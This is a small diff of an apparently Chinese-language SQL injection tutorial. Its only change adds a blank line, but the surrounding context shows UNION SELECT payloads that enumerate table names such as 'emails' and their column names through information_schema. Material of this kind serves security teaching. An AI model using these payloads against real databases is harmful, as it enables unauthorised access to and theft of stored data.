@@ -38,6 +38,7 @@ unioon select 1,2,(select table_name from information_schema.tables table_name='
 成功获取返回得到数据表，emails.同时修改limit n,m中的n和m就可以得到不同的表名。
 3. 获取字段名，以emails表为例子。  
 第一种办法 查询information_schema中对应的数据
+
 ```sql
 union select 1,2,(select column_name from information_schema.columns where table_schema='sql' and table_name = 'emails' limit 0,1;),3
 ```  
